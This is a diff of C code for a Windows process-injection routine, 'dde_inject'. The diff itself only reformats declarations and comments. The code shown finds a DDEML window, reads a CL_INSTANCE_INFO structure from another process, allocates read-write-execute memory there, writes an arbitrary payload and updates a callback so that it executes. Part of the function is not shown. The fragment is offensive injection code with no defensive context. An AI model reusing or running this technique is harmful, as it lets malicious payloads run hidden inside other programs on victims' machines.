@@ -90,16 +90,17 @@ typedef struct tagCL_INSTANCE_INFO {
 #define GWLP_INSTANCE_INFO 0 // PCL_INSTANCE_INFO
 
 VOID dde_inject(LPVOID payload, DWORD payloadSize) {
-    HWND        hw;
-    SIZE_T      rd, wr;
-    LPVOID      ptr, cs;
-    HANDLE      hp;
+    HWND             hw;
+    SIZE_T           rd, wr;
+    LPVOID           ptr, cs;
+    HANDLE           hp;
     CL_INSTANCE_INFO pcii;
-    CONVCONTEXT cc;
-    HCONVLIST   cl;
-    DWORD       pid, idInst = 0;
+    CONVCONTEXT      cc;
+    HCONVLIST        cl;
+    DWORD            pid, idInst = 0;
     
-    // 1. find a DDEML window and read the address of CL_INSTANCE_INFO
+    // 1. find a DDEML window and read the address 
+    //    of CL_INSTANCE_INFO
     hw = FindWindowEx(NULL, NULL, L"DDEMLMom", NULL);
     if(hw == NULL) return;
     ptr = (LPVOID)GetWindowLongPtr(hw, GWLP_INSTANCE_INFO);
@@ -111,7 +112,8 @@ VOID dde_inject(LPVOID payload, DWORD payloadSize) {
     if(hp == NULL) return;
     ReadProcessMemory(hp, ptr, &pcii, sizeof(pcii), &rd);
     
-    // 3. allocate RWX memory and write payload there, update callback
+    // 3. allocate RWX memory and write payload there.
+    //    update callback
     cs = VirtualAllocEx(hp, NULL, payloadSize, 
       MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
